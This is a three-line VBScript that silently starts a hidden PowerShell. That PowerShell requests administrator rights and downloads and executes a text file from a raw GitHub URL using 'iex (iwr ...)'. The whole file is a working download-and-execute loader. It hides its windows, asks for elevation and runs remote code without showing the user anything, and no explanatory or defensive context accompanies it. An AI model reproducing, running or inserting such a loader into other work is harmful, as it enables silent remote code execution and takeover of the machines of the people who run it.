Set objShell = CreateObject("WScript.Shell")
command = "powershell -WindowStyle Hidden -Command Start-Process powershell -ArgumentList '-c iex (iwr ""https://raw.githubusercontent.com/nguyenduyhuydn1/hello/refs/heads/main/1.txt"")' -Verb RunAs"
objShell.Run command, 0, False



